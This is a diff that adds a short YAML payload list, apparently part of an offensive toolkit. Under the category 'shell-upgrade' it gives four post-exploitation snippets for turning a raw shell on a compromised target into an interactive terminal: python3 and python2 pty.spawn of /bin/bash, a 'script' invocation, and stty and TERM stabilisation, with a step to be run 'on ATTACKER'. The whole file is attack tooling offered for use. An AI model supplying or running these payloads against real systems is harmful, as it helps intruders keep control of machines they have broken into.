@@ -1,0 +1,6 @@
+category: shell-upgrade
+snippets:
+  - {key: pty-python3,      desc: "PTY upgrade via python3", payload: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"}
+  - {key: pty-python2,      desc: "PTY upgrade via python2", payload: "python -c 'import pty;pty.spawn(\"/bin/bash\")'"}
+  - {key: pty-script,       desc: "PTY upgrade via script", payload: "script -qc /bin/bash /dev/null"}
+  - {key: pty-full-stty,    desc: "full TTY stabilize (run in target after PTY, then Ctrl+Z on ATTACKER)", payload: "export TERM=xterm && stty rows 40 columns 200"}
